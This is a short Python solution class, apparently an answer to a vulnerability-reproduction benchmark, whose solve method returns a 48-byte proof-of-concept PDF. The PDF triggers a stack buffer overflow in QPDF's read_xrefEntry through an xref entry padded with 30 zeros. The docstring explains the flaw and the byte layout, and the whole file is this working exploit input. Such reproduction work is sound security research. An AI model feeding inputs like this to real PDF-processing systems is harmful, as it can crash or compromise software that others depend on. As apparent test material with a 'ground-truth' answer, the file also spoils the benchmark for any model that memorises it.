class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in QPDF::read_xrefEntry.
        
        The vulnerability is caused by overlong f1 or f2 entries (consisting of zeros) in the xref table.
        QPDF's read_xrefEntry reads these into a fixed-size stack buffer without proper bounds checking
        or EOL validation in some versions.
        
        Ground-truth length is 48 bytes.
        Structure:
        1. PDF Header: %PDF-1.0\n (9 bytes)
        2. xref tag: xref\n (5 bytes)
        3. Subsection header: 0 1\n (4 bytes) - Start at object 0, 1 entry
        4. Malicious entry: "0" * 30 (30 bytes) - Overlong f1 field
        
        Total: 9 + 5 + 4 + 30 = 48 bytes.
        """
        # PDF Header and xref table start
        # %PDF-1.0\n
        # xref\n
        # 0 1\n
        header = b"%PDF-1.0\nxref\n0 1\n"
        
        # Payload: 30 zeros to overflow the buffer used for parsing the offset (f1)
        # This brings the total size to 48 bytes.
        payload = b"0" * 30
        
        return header + payload